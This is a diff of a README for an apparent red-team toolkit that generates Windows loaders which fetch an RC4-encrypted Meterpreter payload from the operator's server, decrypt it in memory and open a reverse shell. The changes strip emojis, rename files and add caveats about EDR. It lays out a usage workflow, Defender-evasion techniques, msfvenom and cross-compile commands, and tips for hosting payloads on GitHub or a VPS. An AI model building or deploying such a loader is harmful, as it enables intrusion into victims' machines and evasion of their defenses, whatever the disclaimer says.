@@ -1,19 +1,21 @@
 # Staged Payload Loader
 
-**Automated system for generating EDR-bypassing Windows loaders that download and execute encrypted MSFVenom payloads.**
+**Automated system for generating AV-bypassing Windows loaders that download and execute encrypted MSFVenom payloads.**
 
-## 🎯 Features
+## Features
 
-- ✅ **Bypasses Windows Defender** - No MSFVenom in the binary
-- ✅ **Staged Download** - Payload fetched at runtime from your server
-- ✅ **RC4 Encryption** - Payload encrypted to avoid detection
-- ✅ **Fully Automated** - One command setup
-- ✅ **Polymorphic** - New encryption key per build
-- ✅ **Clean & Small** - 17KB loader (no embedded payload)
+- **Bypasses Windows Defender** - No MSFVenom in the binary
+- **Staged Download** - Payload fetched at runtime from your server
+- **RC4 Encryption** - Payload encrypted to avoid detection
+- **Fully Automated** - One command setup
+- **Polymorphic** - New encryption key per build
+- **Clean & Small** - 17KB loader (no embedded payload)
+
+**Note:** This bypasses signature-based AV (Windows Defender). Modern EDR solutions may require additional evasion techniques.
 
 ---
 
-## 🚀 Quick Start
+## Quick Start
 
 ### Requirements
 
@@ -42,7 +44,7 @@ Follow the prompts:
 
 ---
 
-## 📖 Usage
+## Usage
 
 ### Step 1: Start HTTP Server
 ```bash
@@ -60,27 +62,27 @@ Serves the encrypted payload on HTTP.
 Catches incoming Meterpreter connections.
 
 ### Step 3: Run on Windows
-Copy `staged_loader.exe` to Windows target and execute.
+Copy `stageless_loader.exe` to Windows target and execute.
 
 **What happens:**
 1. Loader downloads `payload.enc` from your server
 2. Decrypts with RC4 in memory
 3. Executes stageless Meterpreter
 4. Connects back to your listener
-5. You get a shell! 🎉
+5. You get a shell!
 
 ---
 
-## 🔧 How It Works
+## How It Works
 
 ### Traditional Loader (Detected)
 ```
-[Binary with MSFVenom] → Defender scans → ❌ DETECTED
+[Binary with MSFVenom] → AV scans → DETECTED
 ```
 
-### Staged Loader (Bypasses Defender)
+### Staged Loader (Bypasses Signature-Based AV)
 ```
-[Clean Loader] → Defender scans → ✅ CLEAN
+[Clean Loader] → AV scans → CLEAN
        ↓
 Downloads payload.enc (encrypted)
        ↓
@@ -89,28 +91,28 @@ Decrypts in memory
 Executes → Meterpreter shell
 ```
 
-**Key:** Defender can't detect what isn't there yet!
+**Key:** Signature-based AV can't detect what isn't there yet.
 
 ---
 
-## 📁 File Structure
+## File Structure
 
 ```
-beacons/
-├── setup.sh              # Automated setup script
-├── staged_loader.exe     # Clean loader (17KB, NO MSFVenom)
-├── payload.enc           # RC4-encrypted Meterpreter
-├── staged_loader.c       # Loader source code
-├── encrypt_payload.py    # Encryption tool
-├── start_server.sh       # HTTP server script
-├── start_listener.sh     # Metasploit handler script
-├── README.md             # This file
-└── USAGE.md              # Generated usage guide
+stageless-loader/
+├── setup.sh                # Automated setup script
+├── stageless_loader.exe    # Clean loader (17KB, NO MSFVenom)
+├── payload.enc             # RC4-encrypted Meterpreter
+├── stageless_loader.c      # Loader source code
+├── encrypt_payload.py      # Encryption tool
+├── start_server.sh         # HTTP server script
+├── start_listener.sh       # Metasploit handler script
+├── README.md               # This file
+└── QUICKSTART.md           # Quick start guide
 ```
 
 ---
 
-## 🔄 Regenerate for Different Target
+## Regenerate for Different Target
 
 Change IP/Port or generate new payload:
 
@@ -122,7 +124,7 @@ Enter new configuration and the system rebuilds everything.
 
 ---
 
-## 🛡️ Evasion Techniques
+## Evasion Techniques
 
 1. **No Embedded Payload** - MSFVenom not in binary
 2. **Runtime Download** - Fetched after Defender scan
@@ -133,20 +135,22 @@ Enter new configuration and the system rebuilds everything.
 
 ---
 
-## 📊 Test Results
+## Test Results
 
 **Tested Against:**
-- ✅ Windows Defender (Windows 10/11)
-- ✅ Static analysis (no signatures)
-- ✅ VirusTotal (loader only, not payload)
+- Windows Defender (Windows 10/11)
+- Static analysis (no signatures)
+- VirusTotal (loader only, not payload)
 
 **Success Rate:**
 - Loader: **Clean** (no MSFVenom signatures)
 - Payload: **Encrypted** (not detectable until decrypted)
 
+**Note:** These tests verify bypass of signature-based detection. Behavioral detection (EDR) may still trigger on execution.
+
 ---
 
-## ⚠️ Disclaimer
+## Disclaimer
 
 **For authorized penetration testing and red team operations ONLY.**
 
@@ -156,7 +160,7 @@ Enter new configuration and the system rebuilds everything.
 
 ---
 
-## 🐛 Troubleshooting
+## Troubleshooting
 
 ### Loader doesn't download payload
 - Check HTTP server is running: `./start_server.sh`
@@ -182,7 +186,7 @@ Enter new configuration and the system rebuilds everything.
 
 ---
 
-## 🔧 Advanced Usage
+## Advanced Usage
 
 ### Custom Payloads
 
@@ -199,8 +203,8 @@ msfvenom -p windows/x64/meterpreter_bind_tcp \
 
 # Encrypt and rebuild
 python3 encrypt_payload.py reverse_shell.bin payload.enc
-# Update staged_loader.c with new key from payload_keys.h
-x86_64-w64-mingw32-gcc -O2 -s staged_loader.c -o staged_loader.exe -lurlmon
+# Update stageless_loader.c with new key from payload_keys.h
+x86_64-w64-mingw32-gcc -O2 -s stageless_loader.c -o stageless_loader.exe -lurlmon
 ```
 
 ### Remote Hosting
@@ -210,11 +214,11 @@ Instead of local HTTP server, host payload on:
 - **GitHub** (use raw.githubusercontent.com URL)
 - **Your VPS** (HTTPS recommended)
 
-Update `staged_loader.c` line 42 with new URL.
+Update `stageless_loader.c` line 42 with new URL.
 
 ---
 
-## 📚 Additional Resources
+## Additional Resources
 
 - **MSFVenom Payloads:** `msfvenom -l payloads | grep meterpreter`
 - **Metasploit Docs:** https://docs.metasploit.com/
@@ -222,7 +226,7 @@ Update `staged_loader.c` line 42 with new URL.
 
 ---
 
-## 🤝 Contributing
+## Contributing
 
 This is a personal red team toolkit. Use responsibly.
 
@@ -233,7 +237,7 @@ This is a personal red team toolkit. Use responsibly.
 
 ---
 
-## 📝 License
+## License
 
 For authorized security testing only. Use at your own risk.
 
@@ -241,4 +245,4 @@ For authorized security testing only. Use at your own risk.
 
 **Created:** $(date '+%Y-%m-%d')
 **Version:** 1.0
-**Status:** Production Ready ✅
+**Status:** Production Ready
